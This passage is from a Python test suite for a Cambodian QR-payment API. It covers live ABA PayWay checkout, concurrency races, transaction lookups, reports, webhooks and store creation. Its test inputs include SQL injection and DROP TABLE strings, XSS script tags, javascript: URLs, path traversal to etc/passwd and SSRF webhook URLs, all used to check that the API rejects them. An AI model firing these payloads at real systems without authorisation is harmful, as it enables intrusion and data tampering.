                    },
                },
            ],
            note=(
                "The page is a static Nuxt template: always order_details.status=\"OPEN\", amount=\"0.00\", and "
                "the only 'paid'/'failed' strings in it are fixed UI copy. A false PAID here is the worst failure "
                "mode a payment platform can have, so the check asserts it can never happen — for a QR that has "
                "genuinely not been paid."
            ),
        ),
    )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "MANUAL: scan this QR with a phone, pay it, and our API must report approved",
            severity=SEV_CRITICAL,
            network=True,
            manual=True,
            serial=True,
            steps=[
                {
                    "name": "hosted_checkout",
                    "method": "POST",
                    "path": "/v1/khqr/payway/checkout",
                    "body": {"link": PAYWAY_SLUG, "amount": 1.00},
                    "expect": {"status": 200, "check": "payway_hosted_checkout"},
                    "capture": {
                        "live_qr": "$.qr_string",
                        "live_client_id": "$.client_id",
                        "live_request_time": "$.request_time",
                        "live_token": "$.token",
                    },
                },
                {
                    "name": "render_for_scan",
                    "method": "GET",
                    "path": "/v1/khqr/render.svg",
                    "auth": "none",
                    "query": {"payload": "$live_qr", "scale": 8},
                    "expect": {"status": 200, "check": "qr_svg_shape"},
                },
                {
                    "name": "await_payment",
                    "method": "POST",
                    "path": "/v1/khqr/payway/status",
                    "body": {
                        "client_id": "$live_client_id",
                        "request_time": "$live_request_time",
                        "token": "$live_token",
                    },
                    # ABA's own QR lives 180s, so poll just under that: 45 x 4s.
                    # This is the part that gives a human time to actually pay
                    # instead of the case confirming a payment nobody could have
                    # made yet.
                    "poll_until": {"path": "$.paid", "equals": True, "attempts": 45, "delay_ms": 4000},
                    "expect": {"status": 200, "check": "payway_hosted_paid"},
                },
            ],
            note=(
                "Tick 'Include manual / physical-scan cases', run this case, scan the QR it renders inline under "
                "the checkout step, and pay it. The run then polls ABA for up to ~3 minutes and PASSES the moment "
                "ABA reports approved — no credentials, no approval, no browser. ABA's QR expires after 180s, so "
                "generate and pay in one sitting."
            ),
        ),
    )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "ABA's QR is addressed to a resolvable Bakong account, not a slug",
            severity=SEV_CRITICAL,
            network=True,
            serial=True,
            check="qr_destination_is_account",
            method="POST",
            path="/v1/khqr/payway/checkout",
            body={"link": PAYWAY_SLUG, "amount": 1.00},
            expect={"status": 200, "json_has": ["qr_string"]},
            note=(
                "A real phone scanning a QR whose Tag 30.01 was the slug ABAPAYpe518710Y answered \"QR not "
                "found\": the wallet resolves that tag as the payee account and no such account exists. Same "
                "regression guard, now applied to the QR ABA issues for us."
            ),
        ),
    )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "Hosted status answers with a known action, or says why it cannot",
            severity=SEV_HIGH,
            network=True,
            serial=True,
            check="payway_hosted_status",
            steps=[
                {
                    "name": "checkout",
                    "method": "POST",
                    "path": "/v1/khqr/payway/checkout",
                    "body": {"link": PAYWAY_SLUG, "amount": 1.00},
                    "expect": {"status": 200},
                    "capture": {
                        "live_client_id": "$.client_id",
                        "live_request_time": "$.request_time",
                        "live_token": "$.token",
                    },
                },
                {
                    "name": "status",
                    "method": "POST",
                    "path": "/v1/khqr/payway/status",
                    "body": {
                        "client_id": "$live_client_id",
                        "request_time": "$live_request_time",
                        "token": "$live_token",
                    },
                    "expect": {"status": 200, "check": "payway_hosted_status"},
                },
            ],
            note=(
                "This is the only confirmation source that works, so its contract has to hold in both states: a "
                "known action with paid agreeing, or a governed payway_hosted_error — never a silent empty answer "
                "that reads as 'not paid yet'."
            ),
        ),
    )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "Hosted status rejects a session we never issued",
            severity=SEV_HIGH,
            network=True,
            serial=True,
            check="payway_hosted_status",
            method="POST",
            path="/v1/khqr/payway/status",
            body={
                "client_id": "0000000-000000-00000000",
                "request_time": "20260101000000",
                "token": "x" * 64,
            },
            expect={"status_in": [200, 502]},
            note=(
                "A forged session must never come back as a valid payment. 200 (ABA answered, it is simply not an "
                "approved transaction) and 502 (we refused to trust the reply) are both acceptable; a 5xx crash is "
                "not."
            ),
        ),
    )
    # Each accepted call opens a real ABA session and spends their quota, so bad
    # amounts must be refused locally rather than forwarded.
    for label, amount, code in (
        ("zero", 0, "amount_too_low"),
        ("negative", -1, "amount_too_low"),
        ("sub_cent", 0.001, "invalid_amount"),
    ):
        cases.append(
            _case(
                f"LP-{len(cases) + 1:03d}",
                "live-pay",
                f"Hosted checkout rejects amount={label} before calling ABA",
                severity=SEV_HIGH,
                method="POST",
                path="/v1/khqr/payway/checkout",
                body={"link": PAYWAY_SLUG, "amount": amount},
                expect={"status": 422, "detail_contains": code},
            ),
        )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "Hosted checkout rejects a too-short link at the schema boundary",
            severity=SEV_MEDIUM,
            method="POST",
            path="/v1/khqr/payway/checkout",
            body={"link": "ab", "amount": 1.00},
            expect={"status": 422},
        ),
    )
    cases.append(
        _case(
            f"LP-{len(cases) + 1:03d}",
            "live-pay",
            "Hosted status requires every session field",
            severity=SEV_MEDIUM,
            method="POST",
            path="/v1/khqr/payway/status",
            body={"client_id": "2364634-518710-26993684"},
            expect={"status": 422},
        ),
    )
    return cases


def _concurrency_cases() -> list[dict[str, Any]]:
    """Races that would double-charge or double-credit.

    The ``check`` hook sits at the *case* level on purpose: it must see every
    response of the fan-out, not just the first one.
    """
    return [
        _case(
            "CONC-001",
            "concurrency",
            "Parallel creates with one idempotency key yield exactly one payment",
            severity=SEV_CRITICAL,
            method="POST",
            path="/v1/payments",
            body=_pay_body(amount=1.00, idempotency_key="integration-race-key"),
            expect={"status_in": [200, 201]},
            check="unique_ids",
            requires=["store"],
            concurrency=6,
            mutates=True,
            serial=True,
            note="A race here double-charges a customer.",
        ),
        _case(
            "CONC-002",
            "concurrency",
            "Parallel dev-rail pay on one payment credits at most once",
            severity=SEV_CRITICAL,
            method="POST",
            path="/_dev/payments/$payment/pay",
            auth="none",
            expect={"status_in": [200, 404]},
            check="single_success",
            requires=["payment"],
            concurrency=6,
            mutates=True,
            serial=True,
            note="Exactly one credit must win; the rest must see the terminal state.",
        ),
        _case(
            "CONC-003",
            "concurrency",
            "Parallel reads during a write stay consistent",
            severity=SEV_MEDIUM,
            path="/v1/payments",
            query={"store": "$store", "limit": 5},
            expect={"status_in": [200]},
            check="unique_response_ok",
            requires=["store"],
            concurrency=10,
            note="Read endpoints must not 500 under concurrent load.",
        ),
        _case(
            "CONC-004",
            "concurrency",
            "Burst of payment creates does not 5xx",
            severity=SEV_HIGH,
            method="POST",
            path="/v1/payments",
            body=_pay_body(amount=0.01),
            expect={"status_in": [200, 201, 402, 429]},
            check="no_5xx",
            requires=["store"],
            concurrency=12,
            mutates=True,
            serial=True,
        ),
    ]


def _transaction_cases() -> list[dict[str, Any]]:
    cases: list[dict[str, Any]] = []
    counter = 0

    def nxt() -> str:
        nonlocal counter
        counter += 1
        return f"TXN-{counter:03d}"

    # Bakong lookups are all informational in an environment without
    # BAKONG_API_TOKEN: the endpoint legitimately answers 503, and malformed
    # identifiers can be 400/404/422. The only outcome that must never happen is
    # a 5xx, which the runner's safety net still enforces (500 is not listed).
    txn_ok = [200, 400, 404, 405, 422, 503]

    hash_variants = [
        ("valid_64", "a" * 64),
        ("63_chars", "a" * 63),
        ("65_chars", "a" * 65),
        ("empty", ""),
        ("uppercase", "A" * 64),
        ("non_hex", "z" * 64),
        ("sqli", "' OR 1=1--"),
        ("xss", "<script>alert(1)</script>"),
        ("unicode", "លេខ" * 32),
    ]
    for label, value in hash_variants:
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"GET /v1/transactions/hash/{{value}} {label}",
                severity=SEV_MEDIUM,
                path=f"/v1/transactions/hash/{value}",
                expect={"status_in": txn_ok},
                informational=True,
                note="503 bakong_not_configured is expected until a Bakong token is set.",
            ),
        )
    md5_variants = [
        ("valid_32", "b" * 32),
        ("31_chars", "b" * 31),
        ("33_chars", "b" * 33),
        ("empty", ""),
        ("sqli", "' OR 1=1--"),
        ("traversal", "..%2f..%2fetc%2fpasswd"),
        ("unicode", "លេខ" * 16),
        ("null_byte", "%00"),
    ]
    for label, value in md5_variants:
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"GET /v1/transactions/md5/{{value}} {label}",
                severity=SEV_MEDIUM,
                path=f"/v1/transactions/md5/{value}",
                expect={"status_in": txn_ok},
                informational=True,
            ),
        )
    for label, value in (
        ("valid_8", "40ae2382"),
        ("7_chars", "40ae238"),
        ("9_chars", "40ae23829"),
        ("empty", ""),
        ("uppercase", "40AE2382"),
        ("sqli", "40ae23'"),
    ):
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"GET /v1/transactions/short-hash/{{value}} {label}",
                severity=SEV_MEDIUM,
                path=f"/v1/transactions/short-hash/{value}",
                query={"amount": 1.00, "currency": "USD"},
                expect={"status_in": txn_ok},
                informational=True,
            ),
        )
    for suffix in ("instruction-ref", "external-ref"):
        for label, value, _kind in TXN_ID_VARIANTS:
            cases.append(
                _case(
                    nxt(),
                    "transactions",
                    f"GET /v1/transactions/{suffix}/{{ref}} {label}",
                    severity=SEV_MEDIUM,
                    path=f"/v1/transactions/{suffix}/{value}",
                    expect={"status_in": txn_ok},
                    informational=True,
                    note="Lookup keys come from receipts — hostile input is realistic here.",
                ),
            )
    search_bodies: list[tuple[str, dict[str, Any], list[int]]] = [
        ("hash_ok", {"search_type": "hash", "value": "a" * 64}, [200, 400, 503]),
        ("md5_ok", {"search_type": "md5", "value": "b" * 32}, [200, 400, 503]),
        ("short_hash_with_amount", {"search_type": "short_hash", "value": "40ae2382", "amount": 4.99, "currency": "USD"}, [200, 400, 503]),
        ("instruction_ref", {"search_type": "instruction_ref", "value": "INV-1"}, [200, 400, 503]),
        ("external_ref", {"search_type": "external_ref", "value": "REF-1"}, [200, 400, 503]),
        ("unknown_type", {"search_type": "unknown", "value": "abc"}, [422]),
        ("uppercase_type", {"search_type": "MD5", "value": "b" * 32}, [200, 400, 503]),
        ("hyphen_type", {"search_type": "short-hash", "value": "40ae2382"}, [200, 400, 503]),
        ("value_too_short", {"search_type": "hash", "value": "ab"}, [400, 422, 503]),
        ("value_too_long", {"search_type": "hash", "value": "a" * 256}, [400, 422, 503]),
        ("amount_zero", {"search_type": "hash", "value": "a" * 64, "amount": 0}, [422]),
        ("amount_negative", {"search_type": "hash", "value": "a" * 64, "amount": -1}, [422]),
        ("currency_lowercase", {"search_type": "hash", "value": "a" * 64, "currency": "usd"}, [200, 400, 503]),
        ("extra_field", {"search_type": "hash", "value": "a" * 64, "admin": True}, [200, 400, 503]),
        ("missing_value", {"search_type": "hash"}, [422]),
        ("null_value", {"search_type": "hash", "value": None}, [422]),
        ("sqli_value", {"search_type": "instruction_ref", "value": "' OR 1=1--"}, [200, 400, 503]),
    ]
    for label, body, allowed in search_bodies:
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"POST /v1/transactions/search {label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/transactions/search",
                body=body,
                expect={"status_in": sorted(set(txn_ok) | set(allowed))},
                informational=True,
            ),
        )
    for label, body, allowed in (
        ("poll_ok", {"search_type": "short_hash", "value": "40ae2382", "amount": 4.99, "max_attempts": 1, "interval_seconds": 0.5}, [200, 400, 503]),
        ("poll_interval_too_small", {"search_type": "hash", "value": "a" * 64, "interval_seconds": 0.1}, [422]),
        ("poll_interval_too_big", {"search_type": "hash", "value": "a" * 64, "interval_seconds": 60}, [422]),
        ("poll_attempts_zero", {"search_type": "hash", "value": "a" * 64, "max_attempts": 0}, [422]),
        ("poll_attempts_huge", {"search_type": "hash", "value": "a" * 64, "max_attempts": 100000}, [422]),
        ("poll_require_null", {"search_type": "hash", "value": "a" * 64, "require_status": None, "max_attempts": 1}, [200, 400, 503]),
    ):
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"POST /v1/transactions/poll {label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/transactions/poll",
                body=body,
                expect={"status_in": sorted(set(txn_ok) | set(allowed))},
                informational=True,
                serial=True,
                note="Polling blocks — kept to a single attempt.",
            ),
        )
    for label, body, allowed in (
        ("bulk_md5_one", {"search_type": "md5", "values": ["b" * 32]}, [200, 400, 503]),
        ("bulk_md5_100", {"search_type": "md5", "values": ["b" * 32] * 100}, [200, 400, 503]),
        ("bulk_md5_101", {"search_type": "md5", "values": ["b" * 32] * 101}, [422]),
        ("bulk_empty", {"search_type": "md5", "values": []}, [422]),
        ("bulk_hash", {"search_type": "hash", "values": ["a" * 64]}, [200, 400, 503]),
        ("bulk_instruction_ref", {"search_type": "instruction_ref", "values": ["INV-1", "INV-2"]}, [200, 400, 503]),
        ("bulk_sqli", {"search_type": "md5", "values": ["' OR 1=1--"]}, [200, 400, 503]),
        ("bulk_null_in_list", {"search_type": "md5", "values": [None]}, [422]),
        ("bulk_object_in_list", {"search_type": "md5", "values": [{"a": 1}]}, [422]),
        ("bulk_not_a_list", {"search_type": "md5", "values": "abc"}, [422]),
    ):
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"POST /v1/transactions/bulk {label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/transactions/bulk",
                body=body,
                expect={"status_in": sorted(set(txn_ok) | set(allowed))},
                informational=True,
            ),
        )
    for label, body, allowed in (
        ("no_identifiers", {}, [400]),
        ("short_hash_only", {"short_hash": "40ae2382"}, [200, 400, 503]),
        ("full_hash_only", {"full_hash": "a" * 64}, [200, 400, 503]),
        ("md5_only", {"md5": "b" * 32}, [200, 400, 503]),
        ("purchase_only", {"purchase_number": "178893859933472"}, [200, 400, 503]),
        ("reference_only", {"reference_number": "100FT38935395561"}, [200, 400, 503]),
        ("trx_id_only", {"transaction_id": "60940135993"}, [200, 400, 503]),
        ("apv_only", {"apv_number": "455326"}, [200, 400, 503]),
        ("remark_only", {"remark": "paid"}, [400]),
        ("amount_zero", {"short_hash": "40ae2382", "amount": 0}, [422]),
        ("all_fields", {"short_hash": "40ae2382", "amount": 0.99, "currency": "USD", "purchase_number": "1", "reference_number": "2", "transaction_id": "3", "apv_number": "4", "remark": "r"}, [200, 400, 503]),
        ("bad_currency", {"short_hash": "40ae2382", "currency": "XX"}, [200, 400, 503]),
        ("sqli_short_hash", {"short_hash": "' OR 1=1--"}, [200, 400, 503]),
        ("unicode_reference", {"reference_number": "លេខ"}, [200, 400, 503]),
    ):
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"POST /v1/transactions/verify-receipt {label}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/transactions/verify-receipt",
                body=body,
                expect={"status_in": sorted(set(txn_ok) | set(allowed))},
                informational=True,
            ),
        )
    for label, body, allowed in (
        ("missing_body", None, [200, 400, 503]),
        ("valid_email", {"email": "dev@example.com"}, [200, 400, 503]),
        ("invalid_email", {"email": "not-an-email"}, [200, 400, 503]),
        ("empty_email", {"email": ""}, [422, 400]),
        ("sqli_email", {"email": "' OR 1=1--@x.com"}, [200, 400, 503]),
    ):
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"POST /v1/transactions/token/renew {label}",
                severity=SEV_LOW,
                method="POST",
                path="/v1/transactions/token/renew",
                body=body if body is not None else _UNSET,
                expect={"status_in": sorted(set(txn_ok) | set(allowed))},
                informational=True,
            ),
        )
    for label, path, allowed in (
        ("unknown_payment", "/v1/transactions/check-status/PUETcMUOKStjZsCb6zAl8kg9fMRGM85x", [404]),
        ("sqli_payment", "/v1/transactions/check-status/' OR 1=1--", [400, 404]),
        ("verify_unknown", "/v1/transactions/verify-payment/PUETcMUOKStjZsCb6zAl8kg9fMRGM85x", [404]),
    ):
        cases.append(
            _case(
                nxt(),
                "transactions",
                f"POST {path} ({label})",
                severity=SEV_MEDIUM,
                method="POST",
                path=path,
                expect={"status_in": sorted(set(txn_ok) | set(allowed))},
                informational=True,
            ),
        )
    return cases


def _report_cases() -> list[dict[str, Any]]:
    cases: list[dict[str, Any]] = []
    counter = 0

    def nxt() -> str:
        nonlocal counter
        counter += 1
        return f"RPT-{counter:03d}"

    # Values that `datetime.fromisoformat` accepts (3.11 also takes 'Z' and the
    # basic form). An empty string is falsy, so it simply disables the filter.
    valid_from = {"2026-01-01", "2026-09-01", "1970-01-01", "1969-12-31", "2100-01-01",
                  "2026-09-01T12:00:00Z", "20260901", ""}
    valid_to = {"2026-12-31", "2026-09-30", "2028-02-29", ""}
    for flabel, fvalue in DATE_FROM_VARIANTS:
        for tlabel, tvalue in DATE_TO_VARIANTS:
            if fvalue in valid_from and tvalue in valid_to:
                expect: dict[str, Any] = {"status": 200}
                informational = False
            elif fvalue in valid_from or tvalue in valid_to:
                expect = {"status_in": [200, 400]}
                informational = True
            else:
                expect = {"status": 400, "detail_contains": "Invalid"}
                informational = False
            cases.append(
                _case(
                    nxt(),
                    "reports",
                    f"GET /v1/reports/payments.json from={flabel} to={tlabel}",
                    severity=SEV_MEDIUM,
                    path="/v1/reports/payments.json",
                    query={"from": fvalue, "to": tvalue},
                    expect=expect,
                    informational=informational,
                    note="Date filters must be parsed strictly, never interpolated into SQL.",
                ),
            )

    for statuses in (
        "paid",
        "pending",
        "paid,pending",
        "paid, pending",
        "unknown",
        "",
        "'; DROP TABLE payments--",
        "paid,paid,paid",
    ):
        cases.append(
            _case(
                nxt(),
                "reports",
                f"GET /v1/reports/payments.json statuses={statuses!r}",
                severity=SEV_MEDIUM,
                path="/v1/reports/payments.json",
                query={"statuses": statuses},
                expect={"status": 200, "json_has": ["summary", "pagination"]},
                note="An unknown status must filter to nothing, not error or leak.",
            ),
        )
    for store_id in ("st_does_not_exist", "", "'; DROP TABLE stores--", "1", "st_" + "a" * 200):
        cases.append(
            _case(
                nxt(),
                "reports",
                f"GET /v1/reports/payments.json store_id={store_id[:20]!r}",
                severity=SEV_MEDIUM,
                path="/v1/reports/payments.json",
                query={"store_id": store_id},
                expect={"status_in": [200, 404]},
                informational=True,
            ),
        )
    for merchant in ("no-such-merchant", "", "' OR 1=1--", "a" * 260):
        cases.append(
            _case(
                nxt(),
                "reports",
                f"GET /v1/reports/payments.json merchant={merchant[:20]!r}",
                severity=SEV_LOW,
                path="/v1/reports/payments.json",
                query={"merchant": merchant},
                expect={"status_in": [200, 422]},
                informational=True,
            ),
        )
    for page in (1, 0, -1, 2, "abc", 999999, 1.5):
        for per_page in (1, 20, 100, 101, 0, -5, "abc"):
            cases.append(
                _case(
                    nxt(),
                    "reports",
                    f"GET /v1/reports/payments.json page={page!r} per_page={per_page!r}",
                    severity=SEV_MEDIUM,
                    path="/v1/reports/payments.json",
                    query={"page": page, "per_page": per_page},
                    expect={"status_in": [200, 422], "check": "limit_bounds"},
                    informational=True,
                    note="per_page is capped at 100 — a bigger value must be refused, not honoured.",
                ),
            )
    for statuses in ("paid", "', '", "paid', 'x"):
        cases.append(
            _case(
                nxt(),
                "reports",
                f"GET /v1/reports/payments.csv statuses={statuses!r}",
                severity=SEV_LOW,
                path="/v1/reports/payments.csv",
                query={"statuses": statuses},
                expect={"status_in": [200, 403], "check": "csv_header" if statuses == "paid" else None},
                informational=True,
                note="CSV is plan-gated; 403 is a correct answer on lower plans.",
            ),
        )
    cases.append(
        _case(
            nxt(),
            "reports",
            "CSV export has the documented header row",
            severity=SEV_HIGH,
            path="/v1/reports/payments.csv",
            expect={"status_in": [200, 403], "check": "csv_header"},
            informational=True,
            note="Column renames silently break every integrator's importer.",
        ),
    )
    cases.append(
        _case(
            nxt(),
            "reports",
            "CSV export is not served as HTML",
            severity=SEV_HIGH,
            path="/v1/reports/payments.csv",
            expect={"status_in": [200, 403], "header_not": {"content-type": "text/html"}},
            informational=True,
            note="A CSV served as HTML is a stored-XSS vector.",
        ),
    )
    return cases


def _webhook_cases() -> list[dict[str, Any]]:
    cases: list[dict[str, Any]] = []
    counter = 0

    def nxt() -> str:
        nonlocal counter
        counter += 1
        return f"WHK-{counter:03d}"

    for label, url, must_reject in WEBHOOK_URL_VARIANTS:
        cases.append(
            _case(
                nxt(),
                "webhooks",
                f"POST /v1/webhooks url={label}",
                severity=SEV_CRITICAL if must_reject else SEV_MEDIUM,
                method="POST",
                path="/v1/webhooks",
                body={"url": url},
                expect={"status_in": [400, 422]} if must_reject else {"status_in": [201, 400, 422]},
                mutates=True,
                informational=not must_reject,
                note=(
                    "Storing this URL makes the delivery worker fetch it: scheme smuggling / SSRF."
                    if must_reject
                    else "Policy call — storing it is acceptable but must never 5xx."
                ),
                tags=[KIND_API, "ssrf"],
            ),
        )
    for label, url, must_reject in WEBHOOK_URL_VARIANTS[:14]:
        cases.append(
            _case(
                nxt(),
                "webhooks",
                f"PATCH /v1/webhooks/{{id}} url={label}",
                severity=SEV_CRITICAL if must_reject else SEV_MEDIUM,
                method="PATCH",
                path="/v1/webhooks/$webhook",
                body={"url": url},
                expect={"status_in": [400, 404, 422]} if must_reject else {"status_in": [200, 400, 404, 422]},
                requires=["webhook"],
                mutates=True,
                informational=not must_reject,
                note="The patch path must not be a softer SSRF door than create.",
                tags=[KIND_API, "ssrf"],
            ),
        )
    for body in (
        {"url": "https://sink.example.com/hook", "events": []},
        {"url": "https://sink.example.com/hook", "events": ["payment.completed"]},
        {"url": "https://sink.example.com/hook", "events": ["unknown.event"]},
        {"url": "https://sink.example.com/hook", "events": ["payment.completed", "payment.scanned"]},
        {"url": "https://sink.example.com/hook", "events": "payment.completed"},
        {"url": "https://sink.example.com/hook", "events": [1, 2]},
        {"url": "https://sink.example.com/hook", "secret_key": "short"},
        {"url": "https://sink.example.com/hook", "secret_key": "s" * 512},
        {"url": "https://sink.example.com/hook", "secret_key": ""},
        {"url": "https://sink.example.com/hook", "enabled": True},
        {"url": "   "},
        {"url": "https://sink.example.com/hook", "events": ["payment.completed"], "id": 1},
    ):
        cases.append(
            _case(
                nxt(),
                "webhooks",
                f"POST /v1/webhooks body variant {list(body.keys())}",
                severity=SEV_MEDIUM,
                method="POST",
                path="/v1/webhooks",
                body=body,
                expect={"status_in": [201, 400, 422]},
                mutates=True,
                informational=True,
            ),
        )
    for path_suffix in ("/0", "/-1", "/999999999", "/abc", "/'%20OR%201=1--", "/1.5", "/" + "9" * 40):
        for verb in ("patch", "delete", "test", "deliveries", "rotate"):
            method = {"patch": "PATCH", "delete": "DELETE", "test": "POST", "deliveries": "GET", "rotate": "POST"}[verb]
            path = f"/v1/webhooks{path_suffix}" + ("/test" if verb == "test" else "/rotate-secret" if verb == "rotate" else "/deliveries" if verb == "deliveries" else "")
            cases.append(
                _case(
                    nxt(),
                    "webhooks",
                    f"{method} {path} rejects the id",
                    severity=SEV_MEDIUM,
                    method=method,
                    path=path,
                    body={} if method in ("PATCH", "POST") else _UNSET,
                    expect={"status_in": [400, 404, 405, 422]},
                    informational=True,
                    note="Another account's endpoint id must be indistinguishable from a missing one.",
                ),
            )
    cases.append(
        _case(
            nxt(),
            "webhooks",
            "Signed test event uses the documented signature format",
            severity=SEV_CRITICAL,
            method="POST",
            path="/v1/webhooks/$webhook/test",
            expect={"status_in": [200], "check": "signature_shape"},
            requires=["webhook"],
            network=True,
            informational=True,
            note="t=<unix>,v1=<64 hex>, valid against the endpoint secret.",
        ),
    )
    cases.append(
        _case(
            nxt(),
            "webhooks",
            "Deliveries log is paginated and bounded",
            severity=SEV_HIGH,
            method="GET",
            path="/v1/webhooks/$webhook/deliveries",
            query={"limit": 200, "page": 1},
            expect={"status": 200, "check": "delivery_shape"},
            requires=["webhook"],
        ),
    )
    cases.append(
        _case(
            nxt(),
            "webhooks",
            "Deliveries log rejects an out-of-range limit",
            severity=SEV_MEDIUM,
            method="GET",
            path="/v1/webhooks/$webhook/deliveries",
            query={"limit": 5000},
            expect={"status": 422},
            requires=["webhook"],
        ),
    )
    cases.append(
        _case(
            nxt(),
            "webhooks",
            "Rotating the signing secret invalidates the previous one",
            severity=SEV_HIGH,
            method="POST",
            path="/v1/webhooks/$webhook/rotate-secret",
            expect={"status": 200, "json_has": ["signing_secret"], "check": "secret_rotated"},
            requires=["webhook", "webhook_secret"],
            mutates=True,
            destructive=True,
            note="Destructive: the old secret stops verifying.",
        ),
    )
    cases.append(
        _case(
            nxt(),
            "webhooks",
            "Disabling and re-enabling an endpoint is reversible",
            severity=SEV_MEDIUM,
            requires=["webhook"],
            mutates=True,
            serial=True,
            steps=[
                {
                    "name": "disable",
                    "method": "PATCH",
                    "path": "/v1/webhooks/$webhook",
                    "body": {"enabled": False},
                    "expect": {"status": 200, "json_equals": {"status": "disabled"}},
                },
                {
                    "name": "disabled_visible_in_list",
                    "method": "GET",
                    "path": "/v1/webhooks",
                    "expect": {"status": 200, "check": "list_shape"},
                },
                {
                    "name": "re_enable",
                    "method": "PATCH",
                    "path": "/v1/webhooks/$webhook",
                    "body": {"enabled": True},
                    "expect": {"status": 200, "json_equals": {"status": "active"}},
                },
            ],
            note="Serial: toggling the same endpoint from parallel lanes races on the status field.",
        ),
    )
    cases.append(
        _case(
            nxt(),
            "webhooks",
            "Deleting the test endpoint removes it",
            severity=SEV_MEDIUM,
            method="DELETE",
            path="/v1/webhooks/$webhook",
            expect={"status_in": [200, 404]},
            requires=["webhook"],
            mutates=True,
            destructive=True,
            note="Destructive — only run against the disposable test endpoint.",
        ),
    )
    return cases


def _surface_cases() -> list[dict[str, Any]]:
    """Stores, keys, billing, admin and checkout rendering."""
    cases: list[dict[str, Any]] = []
    counter = 0

    def nxt(prefix: str) -> str:
        nonlocal counter
        counter += 1
        return f"{prefix}-{counter:03d}"

    store_bodies: list[tuple[str, dict[str, Any], list[int]]] = [
        ("minimal", {"name": "Test Store"}, [201]),
        ("empty_name", {"name": ""}, [422]),
        ("long_name_120", {"name": "n" * 120}, [201, 400]),
        ("long_name_121", {"name": "n" * 121}, [422]),
        ("name_xss", {"name": "<script>alert(1)</script>"}, [201, 400]),
        ("name_sqli", {"name": "' OR 1=1--"}, [201, 400]),
        ("name_unicode", {"name": "ហាងសាកល្បង"}, [201, 400]),
        ("name_null_byte", {"name": "store\u0000name"}, [201, 400, 422]),
        ("city_too_long", {"name": "Test", "city": "c" * 16}, [422]),
        ("external_id_max", {"name": "Test", "external_id": "e" * 240 + "-$nonce"}, [201, 400]),
        ("external_id_over", {"name": "Test", "external_id": "e" * 256}, [422]),
        ("duplicate_external_id_first", {"name": "Dup Store", "external_id": "dup-$nonce"}, [201, 400]),
        ("brand_color_invalid", {"name": "Test", "brand_color": "red"}, [403, 201, 400]),
        ("brand_color_xss", {"name": "Test", "brand_color": "<script>"}, [403, 201, 400, 422]),
        ("whitelabel_css_xss", {"name": "Test", "whitelabel_css": "body{}</style><script>alert(1)</script>"}, [403, 201, 400]),
        ("logo_url_javascript", {"name": "Test", "logo_image_url": "javascript:alert(1)"}, [403, 201, 400]),
        ("redirect_success_js", {"name": "Test", "redirect_success_url": "javascript:alert(1)"}, [201, 400, 422]),
        ("redirect_success_protocol_relative", {"name": "Test", "redirect_success_url": "//evil.example.com"}, [201, 400, 422]),
        ("link_missing_account_id", {"name": "Test", "link": {"raw_link": "https://link.payway.com.kh/x"}}, [422]),
        ("link_short_raw", {"name": "Test", "link": {"raw_link": "ab", "merchant_account_id": "abc"}}, [422]),
        ("link_valid", {"name": "Test", "link": {"raw_link": PAYWAY_LINK, "merchant_account_id": "abapayway"}}, [201, 400]),
        ("link_javascript", {"name": "Test", "link": {"raw_link": "javascript:alert(1)", "merchant_account_id": "abc"}}, [201, 400]),
        ("extra_unknown_field", {"name": "Test", "surprise": True}, [201, 400]),
    ]
    for label, body, allowed in store_bodies:
        cases.append(
            _case(
                nxt("STO"),
                "stores",
                f"POST /v1/stores {label}",
                severity=SEV_HIGH if "xss" in label or "sqli" in label or "javascript" in label else SEV_MEDIUM,
                method="POST",
                path="/v1/stores",
                body=body,
                expect={"status_in": allowed},
                mutates=True,
                informational=True,
                note="Plan store caps legitimately return 400 max stores reached.",
            ),
        )
    cases.append(
        _case(
            nxt("STO"),
            "stores",
            "Re-using an external_id is refused, not a 500",
            severity=SEV_CRITICAL,
            method="POST",
            path="/v1/stores",
            body={"name": "Dup Store", "external_id": "dup-$nonce"},
            expect={"status_in": [200, 201, 400, 409]},
            mutates=True,
            serial=True,
            note="A unique-constraint violation must surface as a 4xx; an unhandled IntegrityError is a 500.",
        ),
    )
    for label, path, allowed in (
        ("unknown", "/v1/stores/st_does_not_exist", [404]),
        ("sqli", "/v1/stores/' OR 1=1--", [404, 400]),
        ("traversal", "/v1/stores/..%2f..%2fetc%2fpasswd", [404, 400]),
        ("very_long", "/v1/stores/st_" + "a" * 2048, [404, 414]),
    ):
        cases.append(
            _case(
                nxt("STO"),
                "stores",
                f"GET /v1/stores/{{id}} {label}",
                severity=SEV_MEDIUM,
                path=path,
                expect={"status_in": allowed, "detail_in": ["store_not_found", None]},
                informational=label != "unknown",
            ),
        )
    for label, body, allowed in (
        ("valid", {"raw_link": PAYWAY_LINK, "merchant_account_id": "abapayway"}, [200]),
        ("short_raw_link", {"raw_link": "ab", "merchant_account_id": "abc"}, [422]),
        ("javascript_link", {"raw_link": "javascript:alert(1)", "merchant_account_id": "abc"}, [200, 400]),
        ("sqli_merchant_id", {"raw_link": PAYWAY_LINK, "merchant_account_id": "' OR 1=1--"}, [200, 400]),
    ):
        cases.append(
            _case(
                nxt("STO"),
                "stores",
                f"PUT /v1/stores/{{id}}/link {label}",
                severity=SEV_HIGH,
                method="PUT",
                path="/v1/stores/$store/link",
                body=body,
                expect={"status_in": allowed},
                requires=["store"],
                mutates=True,
                destructive=True,
                serial=True,
                informational=True,
                note="Destructive: rewrites the store's settlement destination. Serial — concurrent link rewrites race on the unique payment_links.store_id.",
            ),
        )
    for label, body, allowed in (
